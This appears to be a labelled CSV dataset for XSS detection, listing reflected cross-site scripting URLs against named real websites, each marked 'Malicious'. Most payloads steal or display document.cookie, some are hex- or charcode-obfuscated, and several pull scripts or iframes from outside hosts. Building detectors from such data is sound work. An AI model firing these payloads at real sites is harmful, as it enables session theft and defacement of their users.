Payloads,Class
http://www.tool32.com/search.php?q=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cma<br>rquee%3e%3ch1%3exss%20by%20s%3c/h1%3e%3c/marquee%3e%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/s<br>cript%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20s%3c/h1%3e%3c/marquee%3esha-384%27%22%3e%3c%2ftitle%3e%3c<br>script%3ealert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+s%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://za.benq.com/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.sef.sc.gov.br/ipva/ipva.asp?op=%22%3e'%3e%3c/iframe%3e%3cscript%3ealert(123)%3c/script%3e<br>%22',Malicious
http://www.communities.gov.uk/search/error.asp?start=0&amp;perpage=10&amp;col=odpm&amp;summary=yes&amp;sort=rank&amp;dat<br>e1=&amp;date2=&amp;category=&amp;doctype=&amp;type=&amp;search=%3e%22%3e%3cscript%3ealert('norehem%20was%20here!!')%3c/s<br>cript%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c<br>/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif<br>%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%20%3c,Malicious
http://international.alteclansing.com/australia/index.php?file=product_listing_sect%22/%3e%3cscript%<br>3ealert%281%29;%3c/script%3exxxxion&amp;icat_id=all&amp;iparent_id=headphones,Malicious
http://www.hartmuth-ebert.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.gametrailers.com/tgs2k6.php?p=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%7<br>4%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31<br>%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%<br>31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.nordkeyboards.com/main.asp?tm=products&amp;clpm=nord_stage_2&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;,Malicious
http://www.seekstores.com/search.php?kwd=%22%3e%27%3e%3cscript%3ealert(123)%3c%2fscript%3e&amp;mode=musi<br>c,Malicious
"http://events.haas.berkeley.edu/webevent.cgi?cmd=list2week&amp;de=0&amp;tf=0&amp;sib=0&amp;sb=0&amp;sa=0&amp;ws=0&amp;stz=defaul<br>t&amp;sort=e,m,t&amp;cat=&amp;swe=1&amp;cf=cal&amp;set=1&amp;cal=cal2&amp;m=10&amp;d=21&amp;y=2008%22%3e%3cscript%3ealert(document.cooki<br>e)%3c/script%3e",Malicious
http://www.exampleessays.com/search-result.php?q=%3cscript%3ealert%281%29%3c%2fscript%3e&amp;p=0,Malicious
http://gp.search.gov.hk/search?q=%3c/script%3e%3cscript%3ealert(document.cookie);%3c/script%3e%3c/ht<br>ml%3e%3chtml%3e%3ciframe%20src=%22http://xssed.com%22%3e%3c/iframe%3e%3c/html%3e&amp;output=xml_no_dtd&amp;c<br>lient=depts&amp;proxystylesheet=ogcio_home_adv_frontend&amp;1298556130579=sessionid&amp;gp1=budget_home&amp;gp0=budg<br>et_home&amp;web=this&amp;tpl_id=stdsearch&amp;ui_lang=zh-hk&amp;oe=utf-8&amp;ie=utf-8&amp;sort=date:d:l:d1&amp;entqr=3&amp;entsp=a&amp;u<br>d=1&amp;site=budget_home&amp;filter=0&amp;site=default_collection,Malicious
http://apps.webtrends.com/wizard/?boot=%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.sony.com.tr/support/showexternalpageforproduct.action?supportproductmodelname=mfm-ht75w&amp;t<br>argettab=askanexpert&amp;site=odw_tr_tr&amp;page=productsupportdealerlocator&amp;sectiontype=support&amp;externalurl<br>=%3e%22%3e%3cscript+%0a%0d%3ealert%281482895433%29%3b%3c%2fscript%3e&amp;externallinktype=supporthomelin<br>k,Malicious
http://www.tas.gov.au/tasmaniaonline/nav/topic.asp?topic=%3cscript%3ealert(123)%3c/script%3e,Malicious
"http://www.arcor.de/content/senden.jsp?to=""><script>alert(document.cookie)</script>&headline=x&url=x&datum=x&teasertext=x",Malicious
http://www.techsmith.de/search.asp?cx=003285746377929346975%3auzef3wufigg&amp;lr=lang_de&amp;cof=forid%3a11&amp;<br>q=%3c%22%3c%3cscript%3ealert(document.cookie)%3c%2fscript%3e%3c%22%3c%3cscript%3ealert(document.cook<br>ie)%3c%2fscript%3e&amp;sa.x=24&amp;sa.y=13&amp;sa=search#281,Malicious
http://www.tsvwankendorf.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;ba<br>ckdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.evrensel.net/index.php?txt_arsiv_tarihi=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://nenusigrok.b4net.lt/index.php?page=nforum/forum&amp;forumpage=show_user&amp;useris=%22%3cscript%3eale<br>rt(document.cookie);%3c/script%3e,Malicious
http://kids.britannica.com/search?query=%3cimg+%22%22%22%3e%3cscript%3ealert%28%22cyb3r_pr3dat0r%22%29%3c%2fscript%3e%22%3e&fuzzy=true&ct=null&autobounce=true,Malicious
http://www.mtecbo.gov.br/buscaresultado.asp?tituloavancado=%22%3e%3cscript%3ealert%28document.cookie<br>%29%3c%2fscript%3e&amp;submit=+procurar+&amp;familias=1&amp;ocupacoes=1&amp;sinonimos=1,Malicious
http://www.radzwillinge.at/start/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://login.adultswim.com/services/aswim/flow/login?_flowexecutionkey=e3s2?loginid=%27%27%22%3e%3c<br>%2ftitle%3e%3cscript%3ealert%281337%29%3c%2fscript%3e&amp;password=%27%22%3e%3c%2ftitle%3e%3cscript%3eal<br>ert%281337%29%3c%2fscript%3e&amp;_eventid_submit=submit,Malicious
http://www.ohozaa.com/hotweb/?from=90&amp;cid=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3e%3<br>cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://photo.net/bboard/q-and-a-fetch-msg?msg_id=''&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>''&gt;&lt;h1&gt;djsedat%20narcoticxs&lt;/h1&gt;,Malicious
http://uni15.ogame.de/game/redir.php?url=http://%3c%22%3c%3cscript%3ealert(document.cookie)%3c/scrip<br>t%3e,Malicious
http://ssl1.peoplexs.com/peoplexs22/candidatesportalnologin/vacancy.cfm?cfid=48599&amp;cftoken=46f68819d<br>905f7af-6d908fb5-fe80-0364-7d00f5f7a56208d1&amp;jsessionid=dc303816a1e5acdafbca7f514841514a4de2tr&amp;portal<br>id=956&amp;vacatureid=57514&amp;bedrijfid=0&amp;vacancy=docent%20informaatie%20architectuur%3c/title%3e%3cscript<br>%3ealert(/jurpie/)%3c/script%3e,Malicious
"http://www.motorola.com/business/v/index.jsp?vgnextoid=03b8c0da32e30210vgnvcm1000008b06b00arcrd&amp;vgne<br>xtchannel=87dae73820935110vgnvcm1000008406b00arcrd&amp;appinstancename=default&amp;vgnextrefresh=1%27;alert%<br>28string.fromcharcode%2888,83,83%29%29//\%27;alert%28string.fromcharcode%2888,83,83%29%29//%22;alert<br>%28string.fromcharcode%2888,83,83%29%29//\%22;alert%28string.fromcharcode%2888,83,83%29%29//--%3e%3c<br>/script%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888,83,83%29%29%3c/script%3e",Malicious
http://www.thelist.tas.gov.au/thelistprod/list_security.loginpage?url=&quot;&gt;&lt;script&gt;alert(document.cooki<br>e)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://search.grainger.uiuc.edu/searchaid2/saresultsug.asp?keyword=%22%3euber0n%20says%20%3ch1%3ew00<br>t%3ciframe%20src=%22http://uber0n.darkillusion.org/xsspage.htm%22%3e&amp;s2=direct&amp;project=gateway&amp;selec<br>tion=gen&amp;selection=opac&amp;selection=web&amp;searchbutton=go,Malicious
http://www.ausport.gov.au/site_tools/site_search?query=%27%22%3cscript%3ealert%28%27xss%27%29%3b%3c%<br>2fscript%3e&amp;collection=asc&amp;form=simplefragment,Malicious
http://www.steamboatjack.net/gallery/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://yellowpages.superpages.com/categorybrowser.jsp?src=msn&amp;stype=s%22;%3e%3c/noscript%3e%3cscript<br>%3ealert('starext');%3c/script%3e,Malicious
http://alumni.yale.edu/aya/blueprint/type.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c<br>/script%3e,Malicious
http://www.musiquemachine.com/articles/articles_template.php?id=132%22%3e%20%20%20%20%20%20%20%20%20<br>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br>20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2<br>0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<br>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br>20%20%20%3cscript%20src=http://lupbot.comule.com/asu_abangjs.php%3e%3c/script%3e,Malicious
http://salud.buenosaires.gov.ar/areas/salud/sistemas_salud/index.php?idtema=0&amp;idbarrio=&amp;idcgp=&amp;idtip<br>o=15&amp;texto=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;,Malicious
http://cub.s165.xrea.com/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusom<br>iso.com%22)%3c/script%3e,Malicious
http://apium.org/diary/index.php?setdate=200710&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%<br>65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2<br>c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34<br>%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://chat.support.samsung.com/livechat/chkcic?site_cd=ae&amp;jsoncallback=%22%3e%3cbody%20background=%<br>22http://www.lenagold.ru/fon/ori/sneg/snow29.gif%22%3e%3cscript%3ealert%28%22cheers%20to%20a%20new%2<br>0year%20and%20another%20chance%20for%20us%20to%20get%20it%20right.%20by%20sony%22%29%3c/script%3e%3c<br>iframe%20width=%22540%22%20height=%22450%22%20src=%22http://www.youtube.com/embed/45wmymgyzuy%22%20f<br>rameborder=%220%22%20allowfullscreen%3e%3c/iframe%3e%3cimg%20src=http://media.bigoo.ws/content/chris<br>tmas/gif_santa_claus/santa_claus_78.gif%20align=center%3e%3cimg%20src=http://i1.giftube.ru/multjashk<br>i/kot_vygljadyvaet_927ccf5f2ff24217ac6dd26dceed075a.gif%20align=center%3e,Malicious
http://www.ktla.com/search/dispatcher.front?query=%22%3e%3cscript%3ealert(%27xssed%27)%3c/script%3e&amp;<br>target=article,Malicious
http://www.comcast.net/signin.jsp?redirecturl=http://redirect.comcast.net/redirect/checkauth?redirec<br>turl=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.rsa.gouv.fr/-cartographie-.html?page=rubrique&amp;id_rubrique=10&amp;num_departement=&amp;ville=%27%2<br>2%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e&amp;valid_vil=ok,Malicious
http://www.jj-jelenajankovic.com/sr/blog.php?mesec_je=8%22%3e%3cscript%3ealert%28document.cookie%29%<br>3c/script%3e&amp;godina_je=2009,Malicious
http://cityofvillains.wow-gold-worldofwarcraft.com/cityofvillains/shopping/cityofvillainsgameserverl<br>ist.php?gameid=26&amp;urlkeywords=city%20of%20villains%20-freedom%20-only%27%22%3e%3c/title%3e%3cscript%<br>3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3ehhhhh%3c/h1%3e%3c/marquee%3e,Malicious
http://www.sky-love.net/adduserrule.asp?dmy=1&amp;sex=99%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e,Malicious
http://lz1.intel.com/appzone/pressroom/pressreleases.asp?releasetype=&quot;&gt;&lt;script&gt;alert('s0m.ph');&lt;/scr<br>ipt&gt;,Malicious
http://annonces-auto.tf1.fr/clic2call/appel.asp?tel=33143186276&amp;id=1&amp;nom=test%22%3e%3cscript%3ealert<br>%28/xss/.source%29%3c/script%3e,Malicious
http://memory.loc.gov/natlib/php/phpinfo.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][<br>][][][][][][][][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e,Malicious
http://www.105therock.com/gallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert('by+narcoticxs')&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;fuck+you+rock+king+ferdi+tayfur&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.homebase.ca/main.asp?s=%3cbody%20onload=%22alert('ho%fegeldiniz')%22%20onunload=%22alert(<br>'encore%20was%20here')%22%3e%20hacked%20by%20encore%3ch1%3e,Malicious
http://adspecs.yahoo.de/search-de?q=+}%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dalert%3ba%28b%28%2fxss%2f.source%29%29%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss3d+by+hari%28topsecure.net%29%3c%2fh1%3e%3c%2fmarquee%3e&addr=&hs=1&lat=&lon=&locac=0,Malicious
http://pd.startribune.com/sp?aff=3&amp;keywords=%3cscript+src%3dhttp://vuln.xssed.net/thirdparty/scripts<br>/hotpockets.js%3e,Malicious
http://www.realiteti.org/chat/index.php?nick=%22%3e%3cscript%3ealert(1);%3c/script%3e,Malicious
http://groups.im/u/login_show.do?jurl=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
https://bankingportal.sparkasse-neuss.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google.de%3<br>e,Malicious
http://www2.dgeep.mtss.gov.pt/docbweb/pesqres.asp?startrec=0&amp;base=web&amp;form=comp&amp;recpag=5&amp;searchtxt=&quot;<br>&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.michelin.es/es/auto/auto_ts.jsp?marque=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20<br>-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ms141.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://search.avg.com/route/?q=%3c/script%3e%3cimg%20src=http://data.xssed.org/images/xssed_logo.gif<br>%20onload=alert%28navigator.useragent%29//,Malicious
http://www.sizinsayfa.com/search.php?kword=%22%3e%3ch1%3eby%20st@rext%3c/h1%3e%3cscript%3ealert(docu<br>ment.cookie)%3c/script%3e%20%3cscript%3ealert('by%20st@rext')%3c/script%3e,Malicious
http://www.persecution.com/news/index.cfm?action=fullstory&amp;newsid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://idioms.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cookie)%3b%3c%2f<br>script%3e,Malicious
http://enattendanth5n1.20minutes-blogs.fr/apps/services/emailthis.php?post_id=%27%22%3e%3c/title%3e%<br>3cscript%3ealert(1337)%3c/script%3e,Malicious
http://www.netfreephotos.com/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.artima.com/forums/search.jsp?search=true&amp;q=%27%22%3e%3ch1%3erubberduck%3c%2fh1%3e%3cbr%3e<br>%3cbr%3e%3cmarquee%3ewhitehat+forever%3c%2fmar&amp;forums=-1&amp;range=10,Malicious
http://www.claritycommerce.com/en-gb/news/2006-03-29-a.asp?section=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script<br>&gt;,Malicious
http://go.km.ru/index.asp?sq=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.soso-web.com/yomi/yomi.php?mode=dir&amp;path=/'%3e%22%3e%3cscript/src=http://kusomiso.com/x.j<br>s%3e%3c/script%3e,Malicious
"http://www.haenam.go.kr/home/www/sub_participation/board/?view=';alert(string.fromcharcode(88,83,83)<br>)//\';alert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;;alert(string.<br>fromcharcode(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
"http://anno.de.ubi.com/media1404.php?gallery=media1404&amp;picture=%27%22%3e%3cscript%3ealert%28string.f<br>romcharcode%2888,83,83,69,68,32,98,121,32,86,105,112,101,114,46,97,84%29%29;document.write%28string.<br>fromcharcoe%2860,97,32,104,114,101,102,61,34,104,116,116,112,58,47,47,120,115,115,101,100,46,99,111,<br>109,47,97,114,99,104,105,118,101,47,97,117,116,104,111,114,61,86,105,112,101,114,46,97,84,47,34,62,8<br>8,83,83,69,68,60,47,97,62%29%29;%3c/script%3e",Malicious
http://www.mujeresdeempresa.com/%3cscript%3ealert%28%22xssed.com%22%29%3c/script%3e,Malicious
http://plan9.bell-labs.com/sys/doc/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cma<br>rquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.iom.int/jahia/jahia/media/press-briefing-notes/pbnas/cache/offonce?entryid=27367%22%3e%3c<br>script%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.dosbox.com/comp_list.php?letter=a&amp;search=%3cscript%3ealert%28document.cookie%29%3c%2fscri<br>pt%3e&amp;submit=search,Malicious
https://edms.cern.ch/cedar/plsql/fullsearch.doc_search?p_search_type=&lt;&quot;&lt;&lt;script&gt;alert('hacked%20by%2<br>0kingofchaos')&lt;/script&gt;&amp;p_scope=y&amp;p_top_node=&amp;p_active_node=,Malicious
http://www.ibr.gov.ar/prueba/ibr/publicaciones/publicacionesanuales.php?anio=%3c/script%3e%3cscript%<br>3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.jamendo.com/fr/search?search_string=%22%3e%3cscript%3ealert(/xss%20by%20warvector%20!/);%<br>3c/script%3e%3cmarquee%3e%3ch1%3exss%20by%20warvector%20=)%3c/h1%3e%3c/marquee%3e,Malicious
http://www.chibasuiren.gr.jp/cgi-bin/newsboard/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins<br>%20-%20unkn0wn.eu%27%29%3c%2fscript%3e,Malicious
http://search.musictnt.com/?q=%22%3e%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;type=artist&amp;x=0&amp;<br>y=0,Malicious
http://www.italia.gov.it/itagov2/content/cerca-i-servizi-online?param3=lavoro'%20%3cscript%3ealert(d<br>ocument.cookie);%3c/script%3e,Malicious
http://www.1732.syzefxis.gov.gr/search.asp?langid=1&amp;searchword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.healthcareitnews.com/searchresults.cms?keywords=%3e%22%3e%3cscript%20%3ealert(1337);%3c/s<br>cript%3e&amp;type=local,Malicious
http://www.bue.gov.ar/home/index.php?lang=es=%22%3e%3ciframe%20src=http://www.google.com/%3e%3c/ifra<br>me%3e,Malicious
http://www.seat.ro/ro/test.php?extra=%22%3e%3cscript%3ealert(%271lluzi0n-from-c0deit.com%27%20)%3c/s<br>cript%3e,Malicious
http://www.pocketnurse.com/sc/results.asp?query=%22%3cscript%3ealert%28%27gurus%27%29%3c%2fscript%3e<br>&amp;action=search,Malicious
http://www.dot.ph/whois.asp?domain=google.ph%22%3e%3cscript%3ealert%28%27xssed%27%29%3c/script%3e,Malicious
http://www.searchontario.gov.on.ca/cgi-bin/e_search_results.pl?owner_id=so&amp;offset=0&amp;language=en&amp;filt<br>er=%2b%28meta.collection%3a10100fsco+meta.collection%3a40100federal+meta.collection%3a50000gopsp+met<br>a.collection%3a50800edutcu+meta.collection%3a51000meoi+meta.collection%3a51200fin+meta.collection%3a<br>52200mto+meta.collection%3a56000mgs+meta.collection%3a60100agencies%29+%2blanguage%3aen&amp;query=%3cscr<br>ipt%3ealert%28%27xxsed+by+i-l%c3%a2ndet+from+turkiye+%21%21%21+%27%29%3c%2fscript%3e&amp;search.x=1&amp;sear<br>ch.y=9,Malicious
http://www.hundundsport.de/hunde-barfen/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://miz.bizportal.co.il/web/biznews02.shtml?mid=%22%3e%3cscript%3ealert(document.cookie)%3c/scrip<br>t%3e%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://www.lebenheute.ch/gaman/members.php?id=771%22%3e%3cscript%3ealert%28document.cookie%29%3c/scr<br>ipt%3e,Malicious
http://www.renault.com.ve/gama_modelo.php?id=%22%3e%3cscript%3ealert(/%27drksnix%27/)%3c/script%3e,Malicious
http://direksiyon-dersi.net/mods.php?go=downloads&amp;p=ld&amp;mode=file&amp;val=1%22%3e%3ch1%3eby%20st@rext%3c/<br>h1%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www4.army.mil/ocpa/community/resources/aerial.php?month=06&amp;year=&lt;/title&gt;&lt;script&gt;alert('army%2<br>0army!%20what%20will%20happen%20if%20they%20phish%20your%20staff%20coz%20of%20a%20stupid%20xss??!%20<br>|%20hexspirit')&lt;/script&gt;,Malicious
http://www.huangshantour.com/eforum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://busca5.achei.com.br/cgi-ps/ps_query1.cgi?franq=028&amp;country=br&amp;countries=br&amp;tipo=e&amp;opcao=br&amp;qu<br>ery=%22%3e%3cscript%3ealert%28%22escman+rulezzz%22%29%3c%2fscript%3e,Malicious
http://www.mehtap.tv/index.php?prgid=69&amp;ktgid=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)%3<br>b%3c/script%3e,Malicious
http://www.polska.gov.pl/index.php?document=%22%3e%3cscript%3ealert(/xssed/);%3c/script%3e,Malicious
http://www.turkuler.com/nota/albumler.asp?nid=3040&amp;harf=%22%3e%3cscript%3ealert(document.cookie)%3c/<br>script%3e,Malicious
http://boincstats.com/search/result.php?searchname='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xss<br>.html%20%3c,Malicious
http://www.verizonbusiness.com/us/about/expertise/news2.xml?newsid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script<br>&gt;,Malicious
http://www.vampirewine.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.tekmanx.net/sitede_ara.asp?ara=%3cscript%3ealert(%27drakula%27)%3c/script%3e,Malicious
http://www.zula.co.il/search.php?q=%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
"http://www.sagem-online.com/isa-b2c/b2c/init.do?shop=b2c_par_gb&amp;language=';alert(string.fromcharcode<br>(88,83,83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22<br>;alert(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromchar<br>code(88,83,83))%3c/script%3e",Malicious
http://audi.co.il/print_map.asp?img=%22%3e%3cscript%3ealert%28%22xssed%20by%20jester%20:%29%22%29%3c<br>/script%3e,Malicious
http://www.the-morph.co.uk/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.golfersfriend.co.za/search.php?cx=partner-pub-3446932669241571%3atna71o-hw71&amp;cof=forid%3a<br>10&amp;ie=utf-8&amp;q=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;sa.x=8&amp;sa.y=3&amp;sa=search,Malicious
https://www.sos.mo.gov/businessentity/soskb/searchresults.asp?formname=corpnamesearch&amp;words=starting<br>&amp;searchstr=ad+online'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e&amp;searchtype=se<br>arch,Malicious
http://wap.orlando.metromix.mlogic3g.com/search.jsp?term=team}%3c/style%3e%3cscript%3ea=eval;b=alert<br>;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marque<br>e%3e,Malicious
http://www.cmarket.com/portal/search.action?distance=50&amp;query=%22%3e%3cscript%3ealert(123)%3c/script<br>%3e&amp;search=go&amp;postal=90012&amp;bidmin=&amp;bidmax=&amp;enddays=&amp;cause=&amp;_sourcepage=%2fsearch%2fnoresults.jsp&amp;__f<br>p=il9%2bk%2f%2fndyb5au7ma0ueznlezanmacbrwjv%2fvvryxw4%3d,Malicious
